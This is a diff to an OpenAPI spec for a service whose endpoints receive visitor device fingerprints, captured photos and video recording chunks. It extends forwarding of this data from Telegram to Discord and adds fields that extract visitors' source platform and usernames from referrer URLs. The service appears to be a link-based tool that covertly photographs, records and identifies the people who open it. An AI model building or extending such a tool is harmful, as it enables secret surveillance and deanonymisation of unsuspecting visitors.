@@ -83,7 +83,7 @@ paths:
       operationId: sendDeviceInfo
       tags: [visits]
       summary: Send device fingerprint info
-      description: Receives collected device/browser info and forwards to Telegram
+      description: Receives collected device/browser info and forwards to Telegram and Discord
       requestBody:
         required: true
         content:
@@ -102,7 +102,7 @@ paths:
       operationId: sendPhoto
       tags: [visits]
       summary: Send a captured photo
-      description: Receives a base64-encoded photo and forwards to Telegram
+      description: Receives a base64-encoded photo and forwards to Telegram and Discord
       requestBody:
         required: true
         content:
@@ -121,7 +121,7 @@ paths:
       operationId: sendVideoChunk
       tags: [visits]
       summary: Send a video recording chunk
-      description: Receives a base64-encoded video chunk and forwards to Telegram
+      description: Receives a base64-encoded video chunk and forwards to Telegram and Discord
       requestBody:
         required: true
         content:
@@ -157,6 +157,12 @@ components:
           type: ["number", "null"]
         referrer:
           type: ["string", "null"]
+        source:
+          type: ["string", "null"]
+          description: Detected origin platform (facebook/telegram/discord/etc)
+        sourceName:
+          type: ["string", "null"]
+          description: Username or handle extracted from referrer URL
       required: []
     Visit:
       type: object
@@ -186,6 +192,10 @@ components:
         deviceType:
           type: ["string", "null"]
         referrer:
+          type: ["string", "null"]
+        source:
+          type: ["string", "null"]
+        sourceName:
           type: ["string", "null"]
         createdAt:
           type: string
@@ -264,6 +274,8 @@ components:
           type: ["integer", "null"]
         label:
           type: ["string", "null"]
+        isFinal:
+          type: ["boolean", "null"]
       required:
         - chunk
     OkResponse:
